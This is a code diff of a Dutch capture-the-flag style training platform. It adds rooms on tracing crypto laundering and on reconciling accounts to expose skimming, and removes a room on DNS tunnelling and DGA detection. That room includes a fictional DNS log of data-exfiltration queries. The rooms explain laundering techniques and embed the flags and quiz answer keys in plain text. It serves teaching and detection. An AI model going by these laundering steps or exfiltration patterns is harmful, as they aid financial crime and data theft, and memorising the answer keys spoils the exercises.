+        { q: 'Hoeveel BTC vuil geld bereikt de exchange in deze keten?', answer: ['8', '8.0', '8 btc'], hint: 'De tracer toont het bij de exchange.', explain: 'Er kwam nooit schoon geld bij, dus de 8 BTC die de exchange bereikt is 100% vuil.' },
+        { q: 'Wat verlaagt het taint-PERCENTAGE wél (maar niet het vuile bedrag)?', options: ['Mengen met schoon geld (een mixer met echte liquiditeit of CoinJoin)', 'Het geld langer laten staan', 'Meer peel-stappen', 'Een hogere transactiefee'], answer: 0, explain: 'Alleen schone liquiditeit verdunt het percentage; het vuile bedrag blijft in de mix aanwezig.' },
+        { q: 'Welke vlag staat in de tip-callout?', answer: ['NM{peelen_is_niet_reinigen}'], hint: 'Lees de tip-callout.', explain: 'De vlag is NM{peelen_is_niet_reinigen}.' },
+      ],
+    },
+    {
+      title: 'Taak 2 — Chain-hopping en stablecoins',
+      content: `
+        <p>Om het spoor echt lastig te maken verplaatsen witwassers waarde <strong>over blockchains</strong>
+        (<em>chain-hopping</em>): van Bitcoin naar Ethereum via een bridge, dan naar een <strong>stablecoin</strong> als
+        USDT. De stablecoin haalt het <em>koersrisico</em> eruit — je staat "geparkeerd" in iets dat een dollar waard
+        blijft — en elke hop breekt de analyse op één keten. Onderweg kost het fees, maar dat nemen ze voor lief.</p>
+        <p>Volg de waarde door de hops in het lab. Let op waar het uiteindelijk eruit gaat: de off-ramp blijft het
+        knelpunt.</p>
+        <div class="callout tip"><strong>Beloning:</strong> elke hop breekt de keten, de off-ramp niet. Vlag:
+        <code>NM{hop_na_hop_naar_de_offramp}</code>.</div>
+      `,
+      lab: {
+        type: 'flow',
+        title: 'chain-hopping naar de cash-out',
+        unit: '€',
+        scenario: 'Waarde van ±€ 100.000 hopt van BTC via een mixer en ETH naar een stablecoin en dan de exchange uit.',
+        nodes: CW_NODES,
+        edges: CW_EDGES,
+        ask: [
+          { q: 'Hoeveel euro bereikt uiteindelijk de exchange? (alleen het getal)', answer: ['94000', '94.000'], hint: 'Volg tot de laatste knoop.' },
+          { q: 'Hoeveel ging er in totaal verloren aan fees/kosten?', answer: ['6000', '6.000'], hint: '100.000 erin, hoeveel komt eruit?' },
+          { q: 'Waarom zetten ze het om in een stablecoin?', answer: ['koersrisico', 'om koersrisico te vermijden', 'stabiel', 'koersstabiliteit', 'geen koersrisico'], hint: 'Wat wil je niet terwijl je geld "geparkeerd" staat?' },
+        ],
+      },
+      questions: [
+        { q: 'Wat is chain-hopping?', options: ['Waarde van de ene blockchain naar de andere verplaatsen om het spoor te breken', 'Een wallet vaak van naam veranderen', 'Transacties sneller maken', 'Een hash kraken'], answer: 0, explain: 'Door over ketens te springen moet een onderzoeker elke keten apart volgen — dat versluiert het spoor.' },
+        { q: 'Waarom gebruiken witwassers een stablecoin als USDT?', options: ['Om koersrisico te vermijden terwijl het geld "geparkeerd" staat', 'Omdat het anoniemer is dan Bitcoin', 'Omdat het gratis is', 'Omdat het niet op een blockchain staat'], answer: 0, explain: 'Een stablecoin blijft ±1 dollar waard; zo verlies je geen waarde door koersschommelingen tijdens het wassen.' },
+        { q: 'Hoeveel euro bereikt de exchange na alle hops?', answer: ['94000', '94.000', '€ 94.000', '€94000'], hint: 'De laatste transactie.', explain: 'Na mixer- en swapkosten blijft € 94.000 over bij de off-ramp.' },
+        { q: 'Ondanks al het hoppen: waar grijpt de opsporing nog steeds aan?', options: ['Bij de off-ramp/exchange, waar via KYC een identiteit aan het spoor hangt', 'Bij de mixer', 'Bij de eerste wallet', 'Nergens, het is onvindbaar'], answer: 0, explain: 'Crypto moet uiteindelijk ergens naar gewoon geld; die off-ramp met KYC is het knelpunt.' },
+        { q: 'Welke vlag staat in de tip-callout van deze taak?', answer: ['NM{hop_na_hop_naar_de_offramp}'], hint: 'Lees de tip-callout.', explain: 'De vlag is NM{hop_na_hop_naar_de_offramp}.' },
+      ],
+    },
+    {
+      title: 'Taak 3 — De volgorde en NFT-wash-trading',
+      content: `
+        <p>Zet de stappen van crypto-witwassen in de juiste volgorde, van binnenkomst tot cash-out. En let op een
+        integratietruc die je nog niet zag: <strong>NFT-wash-trading</strong>. Daarbij verkoopt iemand een (vaak
+        waardeloze) NFT aan <em>zichzelf</em> — via een tweede wallet — voor een hoog bedrag. Zo ontstaat op papier
+        "legitieme winst uit kunsthandel", terwijl het gewoon het eigen vuile geld is dat rondpompt.</p>
+        <div class="callout tip"><strong>Beloning:</strong> van losgeld tot "kunsthandel". Vlag: <code>NM{wassen_in_zes_stappen}</code>.</div>
+      `,
+      lab: {
+        type: 'ordering',
+        title: 'de volgorde van crypto-witwassen',
+        prompt: 'Zet de zes stappen op volgorde, van binnenkomst van het losgeld tot de cash-out.',
+        items: CW_STEPS,
+        correct: ['1', '2', '3', '4', '5', '6'],
+        flag: 'NM{wassen_in_zes_stappen}',
+        explain: 'Placement → peel chain → mixer → chain-hopping → stablecoin → cash-out.',
+      },
+      questions: [
+        { q: 'Wat is NFT-wash-trading?', options: ['Een NFT aan jezelf verkopen voor een hoog bedrag om nepwinst/"legitieme" inkomsten te creëren', 'Een NFT schoonmaken', 'Een NFT door een mixer halen', 'Een NFT gratis weggeven'], answer: 0, explain: 'Door aan jezelf te "verkopen" lijkt het vuile geld opeens winst uit kunsthandel — een integratietruc.' },
+        { q: 'In welke witwasfase past NFT-wash-trading het best?', options: ['Integration (het geld terug laten komen als schijnbaar legaal bezit/winst)', 'Placement', 'Layering', 'Geen enkele'], answer: 0, explain: 'Het doel is het gewassen geld een legitieme herkomst (kunsthandelwinst) te geven: dat is integration.' },
+        { q: 'Wat is de eerste stap in de keten?', options: ['Het losgeld komt binnen op een wallet (placement)', 'De cash-out', 'Chain-hopping', 'De stablecoin-omzetting'], answer: 0, explain: 'Zonder binnenkomst (placement) is er niets om te wassen.' },
+        { q: 'Welke vlag hoort bij de juiste volgorde?', answer: ['NM{wassen_in_zes_stappen}'], hint: 'Verschijnt bij de juiste volgorde / staat in de tip-callout.', explain: 'De vlag is NM{wassen_in_zes_stappen}.' },
+      ],
+    },
+  ],
+});
+
+</script>
+<script>
+/* Room: Datastromen — financiële recherche: reconstrueer de rekeningen */
+
+// =======================================================================
+//  Alles FICTIEF: verzonnen bedrijf, rekeningen en bedragen. Je oefent
+//  het reconciliëren van administraties, niet een echte zaak.
+// =======================================================================
+
+// --- Recon: bankafschrift vs. boekhouding (één post ontbreekt) ---
+const FR_BANK = [
+  { date: '2026-02-03', amount: 12000, desc: 'Klantbetaling factuur 2026-114' },
+  { date: '2026-02-05', amount: -3500, desc: 'Leverancier Noord BV' },
+  { date: '2026-02-08', amount: -4500, desc: 'Onbekende BV' },
+  { date: '2026-02-25', amount: -1200, desc: 'Salaris K. Visser' },
+  { date: '2026-02-28', amount: 800, desc: 'Rente' },
+];
+const FR_BOEK = [
+  { date: '2026-02-03', amount: 12000, desc: 'Klantbetaling factuur 2026-114' },
+  { date: '2026-02-05', amount: -3500, desc: 'Leverancier Noord BV' },
+  { date: '2026-02-25', amount: -1200, desc: 'Salaris K. Visser' },
+  { date: '2026-02-28', amount: 800, desc: 'Rente' },
+];
+
+// --- Flow: waar ging de onverklaarde € 4.500 heen? ---
+const FR_NODES = [
+  { id: 'comp', type: 'account', label: 'Bedrijfsrekening' },
+  { id: 'shell', type: 'account', label: 'Onbekende BV (katvanger)' },
+  { id: 'mule', type: 'mule', label: 'Money mule' },
+  { id: 'cash', type: 'cashout', label: 'Contante opname' },
+];
+const FR_EDGES = [
+  { from: 'comp', to: 'shell', amount: 4500, time: '08-02', note: 'onverklaarde betaling (niet geboekt)' },
+  { from: 'shell', to: 'mule', amount: 4300, time: '09-02', note: 'katvanger houdt 200' },
+  { from: 'mule', to: 'cash', amount: 4200, time: '10-02', note: 'mule houdt 100; contant opgenomen' },
+];
+
+CS.registerRoom({
+  id: 'financiele-recherche',
+  path: 'datastromen',
+  order: 6,
+  title: 'Financiële recherche: reconstrueer de rekeningen',
+  icon: '📒',
+  difficulty: 'Gemiddeld',
+  minutes: 50,
+  summary: 'Fraude verstopt zich vaak in het verschil tussen twee administraties. Je leert reconciliëren: een bankafschrift en de boekhouding naast elkaar leggen om de post te vinden die nergens klopt — en dat onverklaarde bedrag vervolgens als geldstroom volgen tot de cash-out. Je sluit af met de interne controles die dit hadden voorkomen.',
+  objectives: [
+    'Uitleggen wat reconciliatie is en waarom het fraude blootlegt',
+    'Twee administraties matchen en de onverklaarde post vinden',
+    'Een saldoverschil verklaren uit een ontbrekende boeking',
+    'Het onverklaarde bedrag als geldstroom volgen tot de cash-out',
+    'Interne controles benoemen (functiescheiding, vier-ogen-principe) die skimming tegengaan',
+  ],
+  terms: [
+    { term: 'Reconciliatie', def: 'Twee administraties die hetzelfde zouden moeten weergeven naast elkaar leggen en afstemmen; verschillen zijn verdacht.' },
+    { term: 'Skimming', def: 'Interne fraude waarbij geld wordt weggesluisd vóór of buiten de boeking om, zodat het in de boekhouding niet opvalt.' },
+    { term: 'Katvanger / shell', def: 'Een tussenrekening of lege BV die alleen dient om geld door te sluizen en de bestemming te verhullen.' },
+    { term: 'Onverklaarde post', def: 'Een transactie die op de ene administratie staat maar niet op de andere — de kern van veel fraudezaken.' },
+    { term: 'Saldoverschil', def: 'Het verschil tussen twee saldi dat precies gelijk is aan de ontbrekende boeking(en).' },
+    { term: 'Functiescheiding', def: 'Taken verdelen zodat één persoon niet én betaalt én boekt én controleert — de belangrijkste rem op interne fraude.' },
+    { term: 'Vier-ogen-principe', def: 'Een tweede persoon moet een betaling goedkeuren; alleen handelen wordt zo moeilijker.' },
+    { term: 'Audit trail', def: 'Het volledige, onveranderbare spoor van wie wat wanneer deed — nodig om een onverklaarde post terug te leiden.' },
+  ],
+  resources: [
+    { title: 'ACFE — Association of Certified Fraud Examiners', url: 'https://www.acfe.com/' },
+    { title: 'FIU-Nederland', url: 'https://www.fiu-nederland.nl/' },
+    { title: 'Rijksoverheid — aanpak fraude', url: 'https://www.rijksoverheid.nl/onderwerpen/fraude' },
+    { title: 'NBA — accountancy en fraude', url: 'https://www.nba.nl/' },
+  ],
+  tasks: [
+    {
+      title: 'Taak 1 — Waarom reconciliatie fraude vindt',
+      content: `
+        <p>Een boekhouding kan er perfect uitzien en tóch liegen — als er geld is weggesluisd <em>buiten de boeking om</em>.
+        Dat heet <strong>skimming</strong>. Je vindt het niet door de boekhouding alléén te lezen, maar door haar te
+        <strong>reconciliëren</strong>: naast een onafhankelijke bron leggen (het bankafschrift) en afstemmen.</p>
+        <p>De logica is simpel: het bankafschrift en de boekhouding horen dezelfde transacties te tonen. Een post die wél op
+        de bank staat maar niet in de boeken (of andersom) is <strong>onverklaard</strong> — en vaak precies het spoor van
+        de fraude. Het <strong>saldoverschil</strong> is dan exact gelijk aan die ontbrekende boeking.</p>
+        <div class="callout warn"><strong>Alles fictief:</strong> het bedrijf, de rekeningen en de bedragen zijn verzonnen.</div>
+        <div class="callout tip"><strong>Beloning:</strong> fraude zit in het verschil. Vlag: <code>NM{zit_in_het_verschil}</code>.</div>
+      `,
+      questions: [
+        { q: 'Wat is reconciliatie?', options: ['Twee administraties naast elkaar leggen en afstemmen om verschillen te vinden', 'De boekhouding opnieuw typen', 'Een wachtwoord resetten', 'Een back-up maken'], answer: 0, explain: 'Reconciliëren stemt bron en boeking op elkaar af; het verschil is het signaal.' },
+        { q: 'Waarom vind je skimming niet door alleen de boekhouding te lezen?', options: ['Omdat het geld juist buiten de boeking om is weggesluisd — het ontbreekt daar', 'Omdat de boekhouding versleuteld is', 'Omdat boekhoudingen altijd kloppen', 'Omdat het bedrag te klein is'], answer: 0, explain: 'Skimming laat de boeking er netjes uitzien; alleen een onafhankelijke bron (de bank) onthult het.' },
+        { q: 'Waaraan is het saldoverschil gelijk?', options: ['Aan de ontbrekende boeking(en)', 'Aan de btw', 'Aan de rente', 'Aan het hoogste bedrag'], answer: 0, explain: 'Als één post ontbreekt, verschillen de saldi precies met dat bedrag.' },
+        { q: 'Welke vlag staat in de tip-callout?', answer: ['NM{zit_in_het_verschil}'], hint: 'Lees de tip-callout.', explain: 'De vlag is NM{zit_in_het_verschil}.' },
+      ],
+    },
+    {
+      title: 'Taak 2 — Leg de administraties naast elkaar',
+      content: `
+        <p>Hier zijn het <strong>bankafschrift</strong> en de <strong>boekhouding</strong> van één maand. Het lab matcht de
+        posten op bedrag en markeert wat niet klopt. Zoek de onverklaarde post en kijk naar het saldoverschil.</p>
+        <div class="callout tip"><strong>Beloning:</strong> vind de post die nergens klopt. Vlag: <code>NM{onverklaarde_post}</code>.</div>
+      `,
+      lab: {
+        type: 'recon',
+        title: 'bankafschrift vs. boekhouding — februari',
+        currency: '€',
+        leftName: 'Bankafschrift',
+        rightName: 'Boekhouding',
+        scenario: 'Vier posten matchen netjes; één staat alleen op de bank. Welke, en voor hoeveel?',
+        left: FR_BANK,
+        right: FR_BOEK,
+        ask: [
+          { q: 'Welk bedrag staat wel op het bankafschrift maar niet in de boekhouding? (alleen het getal)', answer: ['4500', '4.500'], hint: 'De rode, niet-gematchte regel.' },
+          { q: 'Naar welke begunstigde ging die onverklaarde betaling?', answer: ['Onbekende BV', 'onbekende bv'], hint: 'Lees de omschrijving van de niet-gematchte regel.' },
+          { q: 'Hoe groot is het verschil tussen beide saldi?', answer: ['4500', '4.500'], hint: 'Staat onder de twee kolommen.' },
+        ],
+      },
+      questions: [
+        { q: 'Welk bedrag is onverklaard?', answer: ['4500', '4.500', '€ 4.500', '€4500'], hint: 'De niet-gematchte regel op het bankafschrift.', explain: 'De betaling van € 4.500 aan "Onbekende BV" staat wel op de bank, maar niet in de boekhouding.' },
+        { q: 'Naar wie ging de onverklaarde betaling?', answer: ['Onbekende BV', 'onbekende bv', 'onbekende b.v.'], hint: 'De omschrijving van de rode regel.', explain: 'Naar "Onbekende BV" — een lege vennootschap die als doorsluisrekening dient.' },
+        { q: 'Waarom is het saldoverschil precies € 4.500?', options: ['Omdat die ene betaling wel van de bank ging, maar niet werd geboekt', 'Door afrondingsverschillen', 'Door de rente', 'Door de btw'], answer: 0, explain: 'Eén ontbrekende boeking van € 4.500 maakt de twee saldi precies € 4.500 verschillend.' },
+        { q: 'Welke vlag staat in de tip-callout van deze taak?', answer: ['NM{onverklaarde_post}'], hint: 'Lees de tip-callout.', explain: 'De vlag is NM{onverklaarde_post}.' },
+      ],
+    },
+    {
+      title: 'Taak 3 — Volg de onverklaarde betaling',
+      content: `
+        <p>Je hebt de onverklaarde € 4.500 en de begunstigde ("Onbekende BV"). Nu volg je waar dat geld heen ging. Zoals zo
+        vaak loopt het via een katvanger naar een <strong>money mule</strong> en uiteindelijk contant het systeem uit.</p>
+        <div class="callout tip"><strong>Beloning:</strong> volg tot het contant verdwijnt. Vlag: <code>NM{tot_het_contant_verdwijnt}</code>.</div>
+      `,
+      lab: {
+        type: 'flow',
+        title: 'het spoor van de onverklaarde € 4.500',
+        unit: '€',
+        scenario: 'De € 4.500 loopt via "Onbekende BV" en een money mule naar een contante opname.',
+        nodes: FR_NODES,
+        edges: FR_EDGES,
+        ask: [
+          { q: 'Hoeveel werd er uiteindelijk contant opgenomen? (alleen het getal)', answer: ['4200', '4.200'], hint: 'De laatste transactie.' },
+          { q: 'Via welke tussenpartij liep het geld eerst?', answer: ['Onbekende BV', 'onbekende bv', 'de katvanger', 'katvanger'], hint: 'Het eerste knooppunt na de bedrijfsrekening.' },
+        ],
+      },
+      questions: [
+        { q: 'Hoeveel werd er uiteindelijk contant opgenomen?', answer: ['4200', '4.200', '€ 4.200', '€4200'], hint: 'De laatste transactie in de keten.', explain: 'Na een vergoeding voor de katvanger (200) en de mule (100) bleef € 4.200 over om contant op te nemen.' },
+        { q: 'Welke rol speelt "Onbekende BV" in de keten?', options: ['Doorsluisrekening (katvanger) die de bestemming verhult', 'De uiteindelijke ontvanger', 'De bank', 'De accountant'], answer: 0, explain: 'Een lege BV als tussenstap maakt het lastiger om de echte bestemming te zien.' },
+        { q: 'Waarom is een contante opname aantrekkelijk als laatste stap?', options: ['Contant geld is moeilijk verder te volgen dan een rekening', 'Het levert rente op', 'Het is verplicht', 'Het is sneller geboekt'], answer: 0, explain: 'Zodra het geld contant is, stopt het digitale spoor — daarom is het een klassieke cash-out.' },
+        { q: 'Welke vlag staat in de tip-callout van deze taak?', answer: ['NM{tot_het_contant_verdwijnt}'], hint: 'Lees de tip-callout.', explain: 'De vlag is NM{tot_het_contant_verdwijnt}.' },
+      ],
+    },
+    {
+      title: 'Taak 4 — Welke controle had dit voorkomen?',
+      content: `
+        <p>Een onverklaarde betaling kan alleen ongezien blijven als één persoon te veel macht heeft. De belangrijkste
+        remmen zijn <strong>functiescheiding</strong> (dezelfde persoon mag niet én betalen én boeken én controleren) en het
+        <strong>vier-ogen-principe</strong> (een tweede persoon keurt betalingen goed). Een onafhankelijke, periodieke
+        <strong>reconciliatie</strong> en een onveranderbare <strong>audit trail</strong> maken de cirkel rond.</p>
+        <div class="callout tip"><strong>Beloning:</strong> scheid de taken. Vlag: <code>NM{functiescheiding_wint}</code>.</div>
+      `,
+      questions: [
+        { q: 'Welke controle maakt interne fraude het moeilijkst?', options: ['Functiescheiding: niet één persoon mag betalen, boeken én controleren', 'Een langer wachtwoord', 'Een snellere computer', 'Meer back-ups'], answer: 0, explain: 'Als taken gescheiden zijn, kan niemand alleen een betaling doen én verbergen.' },
+        { q: 'Wat houdt het vier-ogen-principe in?', options: ['Een tweede persoon moet een betaling goedkeuren', 'Je controleert alles vier keer', 'Je gebruikt vier wachtwoorden', 'Je bewaart alles vier jaar'], answer: 0, explain: 'Een verplichte tweede goedkeuring voorkomt dat één persoon ongezien geld wegsluist.' },
+        { q: 'Waarom helpt een periodieke, onafhankelijke reconciliatie?', options: ['Ze legt een onverklaarde post snel bloot, voordat het spoor koud wordt', 'Ze versnelt de boekhouding', 'Ze verlaagt de belasting', 'Ze is wettelijk verboden'], answer: 0, explain: 'Regelmatig afstemmen met de bank vangt skimming vroeg — precies wat je in dit lab deed.' },
+        { q: 'Welke vlag staat in de tip-callout van deze taak?', answer: ['NM{functiescheiding_wint}'], hint: 'Lees de tip-callout.', explain: 'De vlag is NM{functiescheiding_wint}.' },
+      ],
+    },
+  ],
+});
+
+</script>
+<script>
 /* Room: Datastromen — capstone: Operatie Spiegelstroom (synthese) */
 
 // =======================================================================
@@ -21927,7 +22842,7 @@ const SP_BLUF_MODEL = [
 CS.registerRoom({
   id: 'operatie-spiegelstroom',
   path: 'datastromen',
-  order: 4,
+  order: 7,
   title: 'Capstone: Operatie Spiegelstroom',
   icon: '🌊',
   difficulty: 'Moeilijk',
@@ -22067,149 +22982,6 @@ CS.registerRoom({
         { q: 'Waarom benoem je een eigenaar per advies?', options: ['Zodat duidelijk is wie welke actie uitvoert — anders gebeurt er niets', 'Om het product langer te maken', 'Omdat het verplicht is', 'Om de analist te beschermen'], answer: 0, explain: 'Een advies zonder actiehouder blijft liggen; de eigenaar maakt het uitvoerbaar.' },
         { q: 'Welke interventie hoort bij de eigenaar "bank/betalingsverkeer"?', options: ['Terugboeking/kickback van de frauduleuze betaling aanvragen', 'Werkplek FIN-07 isoleren', 'Aangifte doen bij de politie', 'DMARC afdwingen'], answer: 0, explain: 'Snelheid telt: een kickback-verzoek bij de bank kan de betaling soms nog terughalen.' },
         { q: 'Welke vlag staat in de tip-callout van deze taak?', answer: ['NM{bottom_line_up_front}'], hint: 'Lees de tip-callout.', explain: 'De vlag is NM{bottom_line_up_front}.' },
-      ],
-    },
-  ],
-});
-
-</script>
-<script>
-/* Room: Datastromen — DNS als stille uitgang (tunneling & DGA) */
-
-// =======================================================================
-//  Alles FICTIEF: .nm.lab-domeinen en verzonnen queries. Je oefent het
-//  lezen van DNS-verkeer, je bevraagt geen echte naamservers.
-// =======================================================================
-
-const DNS_QUERIES = [
-  { time: '02:10:01', name: 'intranet.nm.lab', type: 'A', resp: 'OK' },
-  { time: '02:10:03', name: 'mail.nm.lab', type: 'A', resp: 'OK' },
-  { time: '02:11:00', name: 'k5euo63fmjtv64lomfptgmt5aib7q.exfil.nm.lab', type: 'TXT', resp: 'OK' },
-  { time: '02:11:02', name: 'nf4xq1k9plm2wdr3nxc8vbp7za9qm.exfil.nm.lab', type: 'TXT', resp: 'OK' },
-  { time: '02:11:05', name: 'w1sbt4ydxd9ko5x2tcu5zeye1lp6ab.exfil.nm.lab', type: 'TXT', resp: 'OK' },
-  { time: '02:11:07', name: 'v7qra3xswc8ij4m4p8r2wd9cq7m2v8.exfil.nm.lab', type: 'TXT', resp: 'OK' },
-  { time: '02:11:10', name: 'p0r3n4c8vbk5euo63fmjtv64lomfpt.exfil.nm.lab', type: 'TXT', resp: 'OK' },
-  { time: '02:11:12', name: 'z9qm2wdr3nxc8vbp7za9k9plm2wdxd.exfil.nm.lab', type: 'TXT', resp: 'OK' },
-  { time: '02:11:15', name: 'aegh5t7qk5euo63fmjtv64lomfptgm.exfil.nm.lab', type: 'TXT', resp: 'OK' },
-  { time: '02:12:00', name: 'updates.nm.lab', type: 'A', resp: 'OK' },
-  { time: '02:12:30', name: 'xk3f9q2v8.nm.lab', type: 'A', resp: 'NXDOMAIN' },
-  { time: '02:12:31', name: 'p7m2v8z1a.nm.lab', type: 'A', resp: 'NXDOMAIN' },
-  { time: '02:12:33', name: 'w1sbt4yd0.nm.lab', type: 'A', resp: 'NXDOMAIN' },
-  { time: '02:12:35', name: 'r3nxc8vb2.nm.lab', type: 'A', resp: 'NXDOMAIN' },
-  { time: '02:12:37', name: 'm4p8r2wd9.nm.lab', type: 'A', resp: 'NXDOMAIN' },
-  { time: '02:12:39', name: 'v7qra3xs1.nm.lab', type: 'A', resp: 'NXDOMAIN' },
-  { time: '02:13:00', name: 'mail.nm.lab', type: 'A', resp: 'OK' },
-];
-
-CS.registerRoom({
-  id: 'dns-datastromen',
-  path: 'datastromen',
-  order: 5,
-  title: 'DNS: de stille uitgang',
-  icon: '🌫️',
-  difficulty: 'Gemiddeld',
-  minutes: 45,
-  summary: 'DNS mag bijna overal naar buiten — en juist daarom misbruiken aanvallers het als geheim kanaal. Je leert DNS-tunneling (data wegsmokkelen in lange subdomeinen, vaak TXT) onderscheiden van een DGA (malware die willekeurige domeinen aftast om zijn C2 te vinden), en hoe je beide detecteert en blokkeert.',
-  objectives: [
-    'Uitleggen waarom DNS een aantrekkelijk covert channel is',
-    'DNS-tunneling herkennen aan veel TXT-queries met lange, hoog-entropische subdomeinen naar één domein',
-    'Een DGA herkennen aan veel willekeurige domeinen met NXDOMAIN-antwoorden',
-    'Een DNS-querylog lezen en de verdachte stromen aanwijzen',
-    'Detectie- en blokkeermaatregelen benoemen (NXDOMAIN-ratio, RPZ/sinkhole, lengte/entropie)',
-  ],
-  terms: [
-    { term: 'DNS', def: 'Domain Name System: vertaalt namen (example.com) naar IP-adressen. Vrijwel elk netwerk laat DNS naar buiten.' },
-    { term: 'Covert channel', def: 'Een verborgen communicatiekanaal via een protocol dat voor iets anders bedoeld is — zoals data in DNS-queries.' },
-    { term: 'DNS-tunneling', def: 'Data (of C2-verkeer) verstoppen in DNS: de payload gaat als lange, gecodeerde subdomeinen naar een domein dat de aanvaller beheert; antwoorden komen vaak in TXT-records.' },
-    { term: 'TXT-record', def: 'Een DNS-record dat vrije tekst kan bevatten; populair bij tunneling omdat er veel data in past.' },
-    { term: 'DGA', def: 'Domain Generation Algorithm: malware genereert dagelijks veel willekeurige domeinnamen en probeert ze één voor één; de meeste bestaan niet (NXDOMAIN) tot het de actieve C2 raakt.' },
-    { term: 'NXDOMAIN', def: 'Het DNS-antwoord "dit domein bestaat niet". Een plotselinge piek aan NXDOMAIN is een klassiek DGA-signaal.' },
-    { term: 'Entropie', def: 'Maat voor willekeur. Hoog-entropische (random ogende) subdomeinen wijzen op gegenereerde of gecodeerde namen, niet op menselijk gekozen woorden.' },
-    { term: 'RPZ / sinkhole', def: 'Response Policy Zone of DNS-sinkhole: kwaadaardige domeinen op de resolver blokkeren of omleiden naar een onschadelijk adres.' },
-  ],
-  resources: [
-    { title: 'MITRE ATT&CK — Exfiltration Over Alternative Protocol (T1048)', url: 'https://attack.mitre.org/techniques/T1048/' },
-    { title: 'MITRE ATT&CK — Dynamic Resolution: DGA (T1568.002)', url: 'https://attack.mitre.org/techniques/T1568/002/' },
-    { title: 'SANS — Detecting DNS tunneling', url: 'https://www.sans.org/white-papers/' },
-    { title: 'NCSC — Nationaal Cyber Security Centrum', url: 'https://www.ncsc.nl/' },
-  ],
-  tasks: [
-    {
-      title: 'Taak 1 — Waarom DNS de perfecte sluiproute is',
-      content: `
-        <p>Een firewall blokkeert van alles, maar <strong>DNS</strong> mag bijna altijd naar buiten — anders werkt het
-        internet niet. Precies daarom is DNS geliefd bij aanvallers als <strong>covert channel</strong>: een verborgen
-        kanaal via een protocol dat eigenlijk voor iets anders bedoeld is.</p>
-        <p>Er zijn twee misbruikvormen die je moet kunnen herkennen:</p>
-        <ul>
-          <li><strong>DNS-tunneling</strong> — data wegsmokkelen in de <em>subdomeinen</em> van een domein dat de aanvaller
-          beheert. Het slachtoffer vraagt bijvoorbeeld <code>k5euo63fmjtv64lo….exfil.nm.lab</code> op; de "vraag" ís de data.
-          Antwoorden komen vaak in <strong>TXT</strong>-records.</li>
-          <li><strong>DGA</strong> (domain generation algorithm) — malware verzint dagelijks veel <em>willekeurige</em>
-          domeinnamen en probeert ze af te tasten om zijn C2 te vinden. De meeste bestaan niet, dus je ziet een piek aan
-          <strong>NXDOMAIN</strong>.</li>
-        </ul>
-        <div class="callout warn"><strong>Alles fictief:</strong> de domeinen eindigen op <code>.nm.lab</code> en de queries
-        zijn verzonnen. Je oefent het lezen van DNS-verkeer.</div>
-        <div class="callout tip"><strong>Beloning:</strong> DNS mag naar buiten, dus wordt het misbruikt. Vlag:
-        <code>NM{dns_mag_naar_buiten}</code>.</div>
-      `,
-      questions: [
-        { q: 'Waarom is DNS een aantrekkelijk kanaal voor aanvallers?', options: ['Het mag bijna overal naar buiten, ook waar andere protocollen geblokkeerd zijn', 'Het is versleuteld', 'Het is sneller dan HTTPS', 'Het wordt nooit gelogd'], answer: 0, explain: 'DNS is zo fundamenteel dat het bijna altijd door de firewall mag — ideaal als sluiproute.' },
-        { q: 'Hoe smokkelt DNS-tunneling data naar buiten?', options: ['In lange, gecodeerde subdomeinen naar een domein van de aanvaller', 'Door het IP-adres te veranderen', 'Door de firewall uit te zetten', 'Via e-mailbijlagen'], answer: 0, explain: 'De data zit in de query zelf (de subdomeinen); de resolver stuurt die netjes naar de kwaadaardige naamserver.' },
-        { q: 'Wat is het klassieke signaal van een DGA?', options: ['Een piek aan NXDOMAIN-antwoorden op willekeurige domeinen', 'Veel TXT-records', 'Een enkele grote download', 'Lage jitter'], answer: 0, explain: 'Een DGA raakt veel niet-bestaande domeinen: de NXDOMAIN-ratio schiet omhoog tot het de actieve C2 vindt.' },
-        { q: 'Welke vlag staat in de tip-callout?', answer: ['NM{dns_mag_naar_buiten}'], hint: 'Lees de tip-callout.', explain: 'De vlag is NM{dns_mag_naar_buiten}.' },
-      ],
-    },
-    {
-      title: 'Taak 2 — Lees het DNS-querylog',
-      content: `
-        <p>Hieronder staat een stukje DNS-querylog van één werkplek. Twee dingen zijn mis. Zoek het
-        <strong>tunneling-domein</strong> (veel TXT-queries met lange, willekeurige subdomeinen naar één domein) en herken
-        het <strong>DGA</strong>-patroon (een reeks willekeurige domeinen met NXDOMAIN). Laat je niet afleiden door het
-        normale verkeer naar intranet, mail en updates.</p>
-        <div class="callout tip"><strong>Beloning:</strong> betrap de stille uitgang. Vlag: <code>NM{stille_uitgang_betrapt}</code>.</div>
-      `,
-      lab: {
-        type: 'dnslog',
-        title: 'DNS-queries van werkplek WRK-23',
-        scenario: 'Eén domein slurpt data via TXT; een reeks willekeurige namen botst op NXDOMAIN. Welke is welke?',
-        queries: DNS_QUERIES,
-        ask: [
-          { q: 'Welk domein is het DNS-tunneling-kanaal?', answer: ['exfil.nm.lab'], hint: 'Veel TXT-queries met lange subdomeinen naar hetzelfde domein.' },
-          { q: 'Welk DNS-recordtype gebruikt dat kanaal om data te verbergen?', answer: ['TXT', 'txt'], hint: 'Kijk naar de typekolom bij de verdachte queries.' },
-          { q: 'Hoeveel queries kregen NXDOMAIN (teken van een DGA)?', answer: ['6', 'zes'], hint: 'Lees de regel onder de samenvatting.' },
-        ],
-      },
-      questions: [
-        { q: 'Welk domein wordt gebruikt voor DNS-tunneling?', answer: ['exfil.nm.lab'], hint: 'Veel TXT + lange subdomeinen naar één domein.', explain: 'exfil.nm.lab kreeg zeven TXT-queries met lange, hoog-entropische subdomeinen — klassieke tunneling.' },
-        { q: 'Waaraan herken je de tunneling in het log?', options: ['Veel TXT-queries met lange, willekeurige subdomeinen naar hetzelfde domein', 'Veel NXDOMAIN', 'Eén grote download', 'A-records naar intranet'], answer: 0, explain: 'De combinatie lange subdomeinen + TXT + steeds hetzelfde domein verraadt het tunneling-kanaal.' },
-        { q: 'Hoeveel queries kregen een NXDOMAIN-antwoord?', answer: ['6', 'zes'], hint: 'De samenvatting onderaan het lab.', explain: 'Zes willekeurige domeinen gaven NXDOMAIN — het DGA tast domeinen af op zoek naar de C2.' },
-        { q: 'Welke stroom is juist normaal verkeer?', options: ['De A-queries naar intranet.nm.lab, mail.nm.lab en updates.nm.lab (die resolven netjes)', 'De TXT-queries naar exfil.nm.lab', 'De NXDOMAIN-reeks', 'Alle .nm.lab-queries zijn kwaadaardig'], answer: 0, explain: 'Korte, bekende namen die netjes resolven (OK) zijn gewoon normaal gebruik.' },
